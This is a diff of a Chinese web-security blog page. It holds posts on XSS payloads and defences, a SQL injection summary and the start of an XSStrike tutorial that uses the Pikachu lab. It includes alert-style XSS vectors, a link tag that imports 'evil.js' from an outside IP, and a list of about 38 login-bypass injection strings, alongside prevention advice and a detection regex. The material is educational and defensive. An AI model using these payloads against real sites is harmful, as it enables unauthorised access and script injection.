class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><strong>textarea 标签</strong></h5><p>​<code>&lt;textarea&gt;</code>​标签定义一个多行的文本输入控件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(1); autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><strong>keygen 标签</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure>
+
+<h5 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><strong>marquee 标签</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>
+
+<h5 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><strong>isindex 标签</strong></h5><p>​<code>&lt;link&gt;</code>​标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://47.xxx.xxx.72/evil.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-DOM-型-XSS-的利用"><a href="#4-DOM-型-XSS-的利用" class="headerlink" title="4. DOM 型 XSS 的利用"></a>4. DOM 型 XSS 的利用</h3><blockquote>
+<p>和前文说的一样，各种 js 中捣鼓</p>
+</blockquote>
+<h4 id="1-jQuery-中的-DOM-型-XSS"><a href="#1-jQuery-中的-DOM-型-XSS" class="headerlink" title="(1) jQuery 中的 DOM 型 XSS"></a>(1) jQuery 中的 DOM 型 XSS</h4><p>有问题的代码如下图所示</p>
+<p><img src="/.com//image-20250519171416-tmigybk.png" alt="image"></p>
+<p>若为进行任意过滤的时候 Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-利用遗留下的测试代码"><a href="#2-利用遗留下的测试代码" class="headerlink" title="(2) 利用遗留下的测试代码"></a>(2) 利用遗留下的测试代码</h4><p>不多扯了，详见 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#toc-heading-6">WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)</a></p>
+<hr>
+<h2 id="XSS-的实战应用"><a href="#XSS-的实战应用" class="headerlink" title="XSS 的实战应用"></a>XSS 的实战应用</h2><p>几种钓鱼，和 getshell<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8459">XSS 实战攻击思路总结</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Wordpress/Wordpress-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%E4%BB%8Exss%E5%88%B0getshell--xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8.html">从xss到getshell–xss的深层次利用与探讨</a></p>
+<hr>
+<h2 id="CSRF-和-XSS-的区别"><a href="#CSRF-和-XSS-的区别" class="headerlink" title="CSRF 和 XSS 的区别"></a>CSRF 和 XSS 的区别</h2><p>1、CSRF是<strong>跨站请求伪造;</strong>   XSS是<strong>跨域脚本攻击</strong>。<br>2、CSRF需要用户先<strong>登录网站A,获取cookie;</strong>   XSS<strong>不需要登录</strong>。<br>3、CSRF是利用网站<strong>A本身的漏洞</strong>,去请<strong>求网站A的api;</strong>   XSS是向网站<strong>A注入JS代码</strong>,然后<strong>执行JS里的代码</strong>,<strong>篡改网站A的内容</strong>。（XSS利用的是<strong>站点内的信任用户</strong>，而CSRF则是<strong>通过伪装来自受信任用户的请求</strong>来<strong>利用受信任的网站</strong>。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>。）</p>
+<hr>
+<h2 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h2><ul>
+<li>主要是两层：<br>一： 对输出端的<strong>数据进行编码</strong><br>二: <strong>验证输入</strong></li>
+</ul>
+<p>目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。</p>
+<h3 id="1-对输出端的数据进行编码"><a href="#1-对输出端的数据进行编码" class="headerlink" title="1. 对输出端的数据进行编码"></a>1. 对输出端的数据进行编码</h3><p>1）将一些<strong>字符进行转义</strong>，例如<code>&lt;</code>​，<code>&gt;</code>​进行转义<br>2）白名单，通过一些<strong>标签限制</strong><br>3）不要把<strong>后端传进来的数据</strong>直接作为 <strong>HTML 渲染</strong>，进行处理</p>
+<h3 id="2-CSP-的应用"><a href="#2-CSP-的应用" class="headerlink" title="2. CSP 的应用"></a>2. CSP 的应用</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
+<ul>
+<li><strong>禁止加载外域代码</strong>，防止复杂的攻击逻辑。</li>
+<li><strong>禁止内联脚本执行</strong>。</li>
+<li><strong>禁止外域提交</strong>，网站被攻击后，用户的数据不会泄露到外域。</li>
+<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
+</ul>
+<h3 id="3-其他安全措施"><a href="#3-其他安全措施" class="headerlink" title="3. 其他安全措施"></a>3. 其他安全措施</h3><ul>
+<li><strong>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie</strong>，攻击者完成 <strong>XSS 注入</strong>后也无法<strong>窃取此 Cookie</strong>。</li>
+<li><strong>验证码：</strong> 防止脚本冒充用户提交危险操作。</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/" data-id="cmawcfx9b001scg7k0vgw25nm" data-title="从0到1完全掌握XSS" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
+  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="什么是-Sql-注入？"><a href="#什么是-Sql-注入？" class="headerlink" title="什么是 Sql 注入？"></a>什么是 Sql 注入？</h2><p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p>
+<p>由于以下的环境都是 MySQL 数据库，所以先了解点 MySQL 有关的知识。在 MySQL5.0 之后，MySQL 中默认添加了一个名为<code>information_schema</code>​的数据库，<u>该数据库中的表都是</u>​<u><strong>只读的</strong></u>​<u>，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个</u>​<u><strong>视图</strong></u>​<u>，不是</u>​<u><strong>基本表</strong></u>​<u>，</u>​<u><strong>没有关联的文件</strong></u>​<u>。</u></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql中注释符：#   、/**/ 、  --</span><br></pre></td></tr></table></figure>
+
+<h4 id="information-schema-中三个很重要的表："><a href="#information-schema-中三个很重要的表：" class="headerlink" title="information_schema 中三个很重要的表："></a>information_schema 中三个很重要的表：</h4><ul>
+<li>information_schema.<strong>schemata</strong>: 该数据表存储了 mysql 数据库中的所有数据库的<code>库名</code>​</li>
+<li>information_schema.<strong>tables</strong>： 该数据表存储了 mysql 数据库中的所有数据表的<code>表名</code>​</li>
+<li>information_schema.<strong>columns</strong>: 该数据表存储了 mysql 数据库中的所有列的<code>列名</code>​</li>
+</ul>
+<h2 id="Mysql-中常用的函数"><a href="#Mysql-中常用的函数" class="headerlink" title="Mysql 中常用的函数"></a>Mysql 中常用的函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version():查询数据库的版本</span><br><span class="line">user():查询数据库的使用者</span><br><span class="line">database():数据库</span><br><span class="line">system_user():系统用户名</span><br><span class="line">session_user():连接数据库的用户名</span><br><span class="line">current_user():当前用户名</span><br><span class="line">load_file():读取本地文件</span><br><span class="line">@@datadir:读取数据库路径</span><br><span class="line">@@basedir:mysql安装路径</span><br><span class="line">@@version_complie_os:查看操作系统</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="判断-SQL-注入是否存在"><a href="#判断-SQL-注入是否存在" class="headerlink" title="判断 SQL 注入是否存在"></a>判断 SQL 注入是否存在</h2><ul>
+<li>先加单引号<code>&#39;</code>​、双引号<code>&quot;</code>​、单括号<code>)</code>​、双括号<code>))</code>​等看看是否<strong>报错</strong>，如果报错就可能存在 SQL 注入漏洞了。</li>
+<li>还有在 URL 后面加<code>and 1 = 1 、 and 1 = 2</code>​看页面是否显示一样，<strong>显示不一样</strong>的话，肯定存在 SQL 注入漏洞了。</li>
+<li>还有就是<code>Timing Attack</code>​测试，也就是<code>时间盲注</code>​。有时候通过简单的条件语句比如 <strong>and 1&#x3D;2</strong> 是无法看出异常的。</li>
+<li>在 MySQL 中，有一个<code>Benchmark()</code>​函数，它是用于<strong>测试性能</strong>的。<u>Benchmark(count,expr)，这个函数执行的结果，是将</u>​<u><strong>表达式expr执行count次</strong></u>​<u> 。</u></li>
+</ul>
+<p>因此，利用<code>benchmark函数</code>​，<u>可以让</u>​<u><strong>同一个函数执行若干次</strong></u>​<u>，使得结果返回的时间比平时要长，通过</u>​<u><strong>时间长短</strong></u>​<u>的变化，可以判断注入语句是否执行成功。</u>这是一种<strong>边信道攻击</strong>，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是<code>时间盲注</code>​。</p>
+<p><strong>易出现 SQL 注入的功能点：</strong> 凡是和<code>数据库有交互</code>​的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（<strong>user-agent &#x2F; client-ip</strong> 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 <strong>client-ip</strong> 和 <strong>x-forward-for</strong> 等字段处。这些字段是用来记录<strong>登陆的 ip</strong> 的，有可能会被<strong>存储进数据库</strong>中从而与数据库发生交互导致 sql 注入。</p>
+<h2 id="Sql-注入的分类"><a href="#Sql-注入的分类" class="headerlink" title="Sql 注入的分类"></a>Sql 注入的分类</h2><hr>
+<table>
+<thead>
+<tr>
+<th>分类依据</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>获取信息的方式</td>
+<td>布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等</td>
+</tr>
+<tr>
+<td>提交方式</td>
+<td>GET、POST、COOKIE、HTTP 注入等</td>
+</tr>
+<tr>
+<td>注入点类型</td>
+<td>数字类型的注入、字符串类型的注入、搜索型注入等</td>
+</tr>
+<tr>
+<td>其他注入</td>
+<td>二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原验证登陆语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username= &#x27;&quot;.$username.&quot;&#x27; AND Password= &#x27;&quot;.md5($password).&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>1&#39; or 1=1 or &#39;1&#39;=&#39;1</code>​万能密码语句变为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE Username=&#x27;1&#x27; OR 1=1 OR &#x27;1&#x27;=&#x27;1&#x27; AND Password=&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>即得到优先级关系：<code>or&lt;and&lt;not</code>​，同一优先级默认从左往右计算。</p>
+<ul>
+<li>上面<code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​,因为密码是我们乱输入的。(此处是假)</li>
+<li>Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)</li>
+<li>1=1返回真(此处是真)</li>
+</ul>
+<p>以上的结果是:<code>假 or 真 or假</code>​返回<code>真</code>​。验证通过。再比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select tel,pwd where tel=&#x27;111&#x27; and pwd=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们把电话111看成一个变量，输入电话号码为<code>&#39; or 1= &#39;1</code>​。</p>
+<p>sql就变为如下样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select  tel,pwd where tel=&#x27;&#x27; or 1=&#x27;1&#x27; and pwd=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>上面<code>1=&#39;1&#39; and pwd=&#39;123456&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​。(此处是假)</li>
+<li>tel=‘’ 返回假，数据库没有<code>&#39;&#39;</code>​这个手机号。(此处是假)</li>
+</ul>
+<p>以上的结果是:<code>真 or假</code>​返回<code>真</code>​。验证通过。</p>
+<h3 id="常用的万能密码"><a href="#常用的万能密码" class="headerlink" title="常用的万能密码"></a>常用的万能密码</h3><hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Sql-注入的预防"><a href="#Sql-注入的预防" class="headerlink" title="Sql 注入的预防"></a>Sql 注入的预防</h2><p><u>一般在项目中我们不太会去注意 SQL 注入的问题</u>，因为我们会使用 <strong>ORM</strong>，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行</p>
+<h3 id="预编译-PreparedStatement-JSP"><a href="#预编译-PreparedStatement-JSP" class="headerlink" title="预编译(PreparedStatement)(JSP)"></a>预编译(PreparedStatement)(JSP)</h3><hr>
+<p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select id, no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setInt(1, id);</span><br><span class="line">ps.executeQuery();</span><br></pre></td></tr></table></figure>
+
+<p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p>
+<p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会<strong>影响该SQL语句的语法结构了</strong>，因为<strong>语法分析已经完成了</strong>，而语法分析<strong>主要是分析SQL命令</strong>，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面<strong>输入了这些SQL命令</strong>，<strong>也不会被当成SQL命令来执行了</strong>，因为这些SQL命令的执行， 必须先通过<strong>语法分析</strong>，生成<strong>执行计划</strong>，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句<strong>预编译</strong>可以有效防御SQL注入。</p>
+<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p>
+<h3 id="PDO（PHP）"><a href="#PDO（PHP）" class="headerlink" title="PDO（PHP）"></a>PDO（PHP）</h3><p>首先简单介绍一下什么是<strong>PDO</strong>。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组<strong>数据库抽象层</strong>API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p>
+<p>PDO对于解决SQL注入的原理也是<strong>基于预编译</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );</span><br><span class="line">$data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br></pre></td></tr></table></figure>
+
+<p>实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了<strong>占位符的方式</strong>，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以<strong>防止传那些危险变量</strong>改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行.</p>
+<h3 id="使用正则表达式过滤"><a href="#使用正则表达式过滤" class="headerlink" title="使用正则表达式过滤"></a>使用正则表达式过滤</h3><p>正则表达式是一种用于匹配模式的工具，在检测 SQL 注入时非常有用。我们可以使用正则表达式来过滤和验证用户输入，以确保输入不包含任何恶意的 SQL 代码。下面是一些常见的正则表达式示例：</p>
+<p>对用户输入的特殊字符进行严格过滤，如 ‘、”、&lt;、&gt;、&#x2F;、*、;、+、-、&amp;、|、(、)、and、or、select、union</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(</span><br><span class="line">r&quot;(%27)|(\&#x27;)|(\-\-)|(%23)|(#)|&quot;  # Regex for detection of SQL meta-characters</span><br><span class="line">r&quot;\w*((%27)|(\&#x27;))\s+((%6F)|o|(%4F))((%72)|r|(%52))\s*|&quot;  # Modified regex for detection of SQL meta-characters eg: &#x27; or 1 = 1&#x27; detect word &#x27;or&#x27;,</span><br><span class="line">r&quot;((%3D)|(=))[^\n]*((%27)|(\&#x27;)|(\-\-)|(%3B)|(;))&quot;  # Regex for typical SQL Injection attack eg: &#x27;= 1 --&#x27;</span><br><span class="line">r&quot;((%27)|(\&#x27;))union|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))select|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))insert|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))update|&quot;  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">r&quot;((%27)|(\&#x27;))drop&quot;,  # Regex for detecting SQL Injection with the UNION keyword</span><br><span class="line">re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line">r = pattern.search(&quot;&#x27; OR 1 -- -&quot;)</span><br><span class="line">if r:</span><br><span class="line">return True</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Web 应用中用于<strong>连接数据库的用户</strong>与<strong>数据库的系统管理员用户</strong>的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库。</p>
+<p>设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p>
+<p>严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查。</p>
+<p>使用 Web 应用防火墙。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="cmawcfx9o0037cg7k8df03rlt" data-title="SQL注入总结" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li></ul>
 
     </footer>
   </div>
@@ -1078,11 +917,287 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawb0xv60010747k7pwz34pa" data-title="SQL报错注入技术" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" data-id="cmawcfx9z003tcg7khb109zni" data-title="SQL报错注入技术" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/工具使用/xsstrike/使用教程/实战" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/" class="article-date">
+  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/%E5%AE%9E%E6%88%98/">XSStrike实战教程</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="XSStrike的基本使用"><a href="#XSStrike的基本使用" class="headerlink" title="XSStrike的基本使用"></a>XSStrike的基本使用</h1><p>下面是他的常用命令</p>
+<ul>
+<li>-u url</li>
+<li>–skip 跳过确认提示</li>
+<li>–skip-dom 跳过dom型扫描</li>
+<li>–data post型时的数据</li>
+</ul>
+<p>这里我们使用pikachu平台进行测试</p>
+<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p><img src="/.com//image-20250520023352-uo3hi74.png" alt="image"></p>
